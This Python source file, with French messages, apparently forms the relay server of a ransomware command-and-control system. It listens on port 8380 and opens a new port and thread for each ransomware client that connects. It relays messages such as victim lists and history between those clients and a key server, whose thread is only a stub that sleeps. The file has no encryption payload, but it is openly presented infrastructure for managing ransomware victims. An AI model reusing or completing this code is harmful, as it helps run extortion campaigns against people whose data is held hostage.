import threading
import queue
import utile.network as net
import time
import utile.message as message


ransomware_threads = []
ransomware_queue = []

def Serveur_cles(FIFO):
    socket, gp = net.connect_to_serv()
    while True:
        time.sleep(5)
        #print(ransomware_threads, '\n', ransomware_queue)
        #print()


def ransomware(FIFO, PORT):
    indicateur = False
    socket_serv = net.start_net_serv_client(port=PORT)
    FIFO_resp = queue.Queue()
    ransomware_queue.append(FIFO_resp)
    id = len(ransomware_queue)-1
    print('Ouverture d\'une écoute sur le port', PORT)

    while True:
        conn, addr = socket_serv.accept()
        if indicateur == False:
            FIFO.put("{RANSOMWARE_REQ: None}")
            indicateur = True
        print(
            f'[+] Connexion établie sur le Thread Ransomware-{id} sur l\'adresse {conn.getsockname()[0]}:{conn.getsockname()[1]}\n')
        while True:
            try:
                recv_data = net.receive_message(conn)
                FIFO.put(recv_data)
            except:
                conn.close()
                print(f'[+] Déconnexion du Ransomware-{id} sur le port : {PORT}')
                break

            while True:
                data = FIFO_resp.get()
                net.send_message(conn, data)
                if message.get_message_type(data) == 'HISTORY_END' or message.get_message_type(
                        data) == 'LIST_VICTIM_END':
                    break


def main():
    PORT = 8380
    FIFO = queue.Queue()
    # création des threads
    Serveur_cles_thread = threading.Thread(target=Serveur_cles, daemon=True, args=(FIFO,))
    ransomware12 = threading.Thread(target=ransomware, daemon=True, args=(FIFO, PORT))
    name, id = (ransomware12.getName()).split('-')
    ransomware12.setName('Ransomware-' + str((int(id) - 2)))
    ransomware_threads.append(ransomware12)

    # Lancement des threads

    ransomware12.start()
    time.sleep(5)
    Serveur_cles_thread.start()

    while True:
        data = FIFO.get()
        if data == "{RANSOMWARE_REQ: None}":
            PORT += 1
            new_ransomware = threading.Thread(target=ransomware, daemon=True, args=(FIFO, PORT))
            name, id_thread = (new_ransomware.getName()).split('-')
            new_ransomware.setName('Ransomware-' + str((int(id_thread) - 2)))
            ransomware_threads.append(new_ransomware)
            new_ransomware.start()

if __name__ == '__main__':
    main()
